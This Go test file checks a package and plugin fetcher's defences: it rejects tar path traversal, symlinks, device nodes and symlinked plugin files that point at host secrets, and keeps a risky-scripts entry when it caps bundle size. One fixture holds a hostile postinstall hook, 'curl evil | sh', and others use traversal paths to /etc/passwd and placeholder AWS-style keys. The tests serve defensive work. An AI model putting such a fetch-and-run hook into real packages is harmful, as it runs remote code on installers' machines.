package fetchers

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ---------- tar safety -------------------------------------------

func TestSafeTarMember_RejectsSymlink(t *testing.T) {
	h := &tar.Header{Name: "foo.js", Typeflag: tar.TypeSymlink}
	if safeTarMember(h) {
		t.Error("symlink accepted")
	}
}

func TestSafeTarMember_RejectsAbsolutePath(t *testing.T) {
	h := &tar.Header{Name: "/etc/passwd", Typeflag: tar.TypeReg}
	if safeTarMember(h) {
		t.Error("absolute path accepted")
	}
}

func TestSafeTarMember_RejectsParentTraversal(t *testing.T) {
	h := &tar.Header{Name: "../etc/passwd", Typeflag: tar.TypeReg}
	if safeTarMember(h) {
		t.Error("../ accepted")
	}
	h2 := &tar.Header{Name: "a/../../b", Typeflag: tar.TypeReg}
	if safeTarMember(h2) {
		t.Error("a/../../b accepted")
	}
}

func TestSafeTarMember_AcceptsRegularNested(t *testing.T) {
	h := &tar.Header{Name: "package/index.js", Typeflag: tar.TypeReg}
	if !safeTarMember(h) {
		t.Error("regular member rejected")
	}
}

func TestSafeTarMember_RejectsDeviceNodes(t *testing.T) {
	for _, tf := range []byte{tar.TypeChar, tar.TypeBlock, tar.TypeFifo, tar.TypeLink} {
		h := &tar.Header{Name: "x", Typeflag: tf}
		if safeTarMember(h) {
			t.Errorf("device/link type %d accepted", tf)
		}
	}
}

func TestWalkTar_RejectsSymlinkPayload(t *testing.T) {
	// Build a tar.gz with a regular file and a symlink. Only the
	// regular file must come through.
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	body := []byte("regular contents")
	_ = tw.WriteHeader(&tar.Header{
		Name: "package/index.js", Typeflag: tar.TypeReg, Size: int64(len(body)),
	})
	_, _ = tw.Write(body)
	_ = tw.WriteHeader(&tar.Header{
		Name: "package/evil-link", Typeflag: tar.TypeSymlink, Linkname: "/etc/passwd",
	})
	_ = tw.Close()
	_ = gz.Close()

	got, _, err := readTarGzMembers(buf.Bytes(), true,
		func(_ string, _ []string) bool { return true },
		func(_ string, parts []string) string { return strings.Join(parts, "/") })
	if err != nil {
		t.Fatalf("readTarGzMembers: %v", err)
	}
	if _, ok := got["index.js"]; !ok {
		t.Errorf("regular file missing: %v", got)
	}
	if _, ok := got["evil-link"]; ok {
		t.Error("symlink leaked into bundle")
	}
}

// ---------- fitBundle cap ---------------------------------------

func TestFitBundle_CapsTotalBytes(t *testing.T) {
	files := newOrderedFiles()
	for _, k := range []string{"a", "b", "c", "d"} {
		files.set(k, strings.Repeat("x", 20_000))
	}
	out := fitBundle(files)
	total := 0
	for _, v := range out {
		total += len(v)
	}
	if total > MaxBundleBytes+200 { // +200 accounts for "cap reached" marker
		t.Errorf("bundle exceeded cap: %d", total)
	}
}

func TestFitBundle_PriorityOrderPreservesRiskyScripts(t *testing.T) {
	// Insert risky-scripts entry FIRST, then several large entries.
	// Even when the large entries blow the cap, risky-scripts must
	// still be in the output. This pins the security-critical
	// ordering guarantee.
	files := newOrderedFiles()
	files.set("package.json#scripts", `{"postinstall": "curl evil | sh"}`)
	for i := 0; i < 20; i++ {
		files.set(string(rune('a'+i)), strings.Repeat("x", 8_000))
	}
	out := fitBundle(files)
	if _, ok := out["package.json#scripts"]; !ok {
		t.Errorf("risky-scripts entry was evicted; bundle: %v", out)
	}
}

func TestOrderedFiles_PreservesInsertionOrder(t *testing.T) {
	files := newOrderedFiles()
	files.set("z", "1")
	files.set("a", "2")
	files.set("m", "3")
	files.set("a", "2-updated") // re-insert keeps original position
	want := []string{"z", "a", "m"}
	for i, k := range files.order {
		if k != want[i] {
			t.Errorf("position %d: got %q want %q", i, k, want[i])
		}
	}
	if files.data["a"] != "2-updated" {
		t.Errorf("re-insert should overwrite content: %q", files.data["a"])
	}
}

// ---------- plugin local: symlink rejects --------------------

func TestFetchPluginLocal_RejectsSymlinkedManifest(t *testing.T) {
	tmp := t.TempDir()
	plugin := filepath.Join(tmp, "evil")
	if err := os.MkdirAll(filepath.Join(plugin, ".claude-plugin"), 0o755); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(tmp, "host-secret")
	if err := os.WriteFile(target, []byte("AKIAIOSFODNN7EXAMPLE"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, filepath.Join(plugin, ".claude-plugin", "plugin.json")); err != nil {
		t.Fatal(err)
	}
	b := FetchPluginLocal("evil", plugin)
	if b == nil {
		t.Fatal("nil bundle")
	}
	if _, ok := b.Files[".claude-plugin/plugin.json"]; ok {
		t.Error("symlinked plugin.json leaked into bundle")
	}
	for _, content := range b.Files {
		if strings.Contains(content, "AKIAIOSFODNN7EXAMPLE") {
			t.Error("host secret embedded in bundle")
		}
	}
}

func TestFetchPluginLocal_RejectsSymlinkInHooks(t *testing.T) {
	tmp := t.TempDir()
	plugin := filepath.Join(tmp, "plug")
	if err := os.MkdirAll(filepath.Join(plugin, "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(tmp, "secret.txt")
	if err := os.WriteFile(target, []byte("AKIA-EVIL"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, filepath.Join(plugin, "hooks", "leak.sh")); err != nil {
		t.Fatal(err)
	}
	b := FetchPluginLocal("plug", plugin)
	if b == nil {
		t.Fatal("nil bundle")
	}
	if _, ok := b.Files["hooks/leak.sh"]; ok {
		t.Error("symlink in hooks/ leaked")
	}
}

func TestFetchPluginLocal_BundlesRealFiles(t *testing.T) {
	tmp := t.TempDir()
	plugin := filepath.Join(tmp, "ok")
	if err := os.MkdirAll(filepath.Join(plugin, ".claude-plugin"), 0o755); err != nil {
		t.Fatal(err)
	}
	manifest := map[string]any{"name": "ok", "version": "1.0"}
	data, _ := json.Marshal(manifest)
	if err := os.WriteFile(filepath.Join(plugin, ".claude-plugin", "plugin.json"), data, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(plugin, "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(plugin, "hooks", "demo.sh"), []byte("echo hi"), 0o644); err != nil {
		t.Fatal(err)
	}
	b := FetchPluginLocal("ok", plugin)
	if b == nil {
		t.Fatal("nil bundle")
	}
	if _, ok := b.Files[".claude-plugin/plugin.json"]; !ok {
		t.Error("real manifest missing")
	}
	if _, ok := b.Files["hooks/demo.sh"]; !ok {
		t.Error("hooks file missing")
	}
	if b.Version != "1.0" {
		t.Errorf("version metadata not merged: %q", b.Version)
	}
}

func TestFetchPluginLocal_NilForMissingDir(t *testing.T) {
	if FetchPluginLocal("x", "/nonexistent/path/x9q") != nil {
		t.Error("nonexistent dir returned a bundle")
	}
}

func TestPluginInterestingDirs(t *testing.T) {
	hasSkills := false
	for _, d := range pluginInterestingDirs {
		if d == "skills" {
			hasSkills = true
			break
		}
	}
	if !hasSkills {
		t.Error("skills/ missing from pluginInterestingDirs")
	}
}
